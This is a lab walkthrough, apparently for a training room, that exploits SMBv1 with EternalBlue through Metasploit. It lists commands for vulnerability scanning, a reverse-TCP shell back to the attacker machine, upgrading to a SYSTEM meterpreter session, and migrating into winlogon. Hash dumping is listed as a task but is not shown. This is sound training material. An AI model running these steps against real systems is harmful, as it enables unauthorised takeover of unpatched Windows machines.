# Blue

## Introduction
"Deploy & hack into a Windows machine, leveraging common misconfigurations issues."

## Objective
Exploit the critical flaws of Server Message Block version 1, a network file-sharing protocol, using EternalBlue, a computer exploit.

## Tasks
1. Reconnaissance
    - scanning and enumeration
    - look for the machine's vulnerability
2. Gain Access
    - exploit the vulnerability via metasploit
3. Escalate
    - convert a shell to a meterpreter shell, gain escalated privileges, and stabilize the session
4. Cracking
    - dump pass hashes and crack the non-default user's hash 
5. Find flags!
    - navigate inside the filesystem and locate critical directories

## Walkthrough
- Start the prvoided lab machine.
- To attack the machine, you can use the provided attacker machine or use a local/virtual machine via vpn.

---

### Reconnaissance
Command: `nmap -sV -vv --script=vuln [target IP]`
- `nmap` - a powerful tool for scanning and enumeration
- `sV` - service/version scan
- `vv` - show the process line by line
- `--script=vuln` - find the machine's vulnerability
- This command will show the target machine's listening ports/services, their versions, and vulnerabilities while showing the real-time process by line.

Determine how many ports under 1000 are open and what is the machine vulnerable to (ex: ms08-067).

### Gain access
1. Open Metasploit, a powerful tool for ethical hacking.
    - Command: `msfconsole`
2. Look for the exploitation code that you will run against the machine.
    - Command: `search [ms??-???]` 
    - Look for the full path of code.
    - Hint: `eternalblue`
3. Use the exploitation code.
    - Command: `use exploit/path/of/the/code`
4. Show required values.
    - Command: `show options`
    - The fields with `Yes` are required values, in this case, `RHOSTS` and `LHOST`
5. Set the required values.
    - Command: `set [value] [IP]`
    - `RHOSTS` - the target machine
    - `LHOST` - the attacker machine
    - For the sake of learning how to upgrade shell to a meterpreter shell, downgrade the meterpreter into a shell using the following command.
    - Command: `set payload windows/x64/shell/reverse_tcp`
6. Run the exploit.
    - Command: `run` or `exploit`

### Escalate
1. Put the session in the background and look for the session number.
	- Press `Ctrl` + `z` to put the session in the background.
	- Command: `sessions -l` to show the sessions
2. Command: `use post/multi/manage/shell_to_meterpreter`
3. Show required values and set the session.
	- Command: `show options` to show the required values.
	- Command: `set SESSION [session number]` to upgrade that specific session.
4. Run the code.
	- Command: `run` or `exploit`
5. Look for the upgraded session.
	- Command: `sessions -l`
	- Look for the session with NT AUTHORITY\SYSTEM, an account with the highest privileges in a Windows environment.
6. Use the upgraded session.
	- Command: `sessions -i [session number]`
7. Migrate to a process to stabilize the session.
	- Command: `ps` - shows a snapshot of active processes
	- Look for a process with the SYSTEM privilege, winlogon for example, and remember its PID at the leftmost column.
	- Command: `migrate [PID]`
	- Try and try and change process until you succeed.
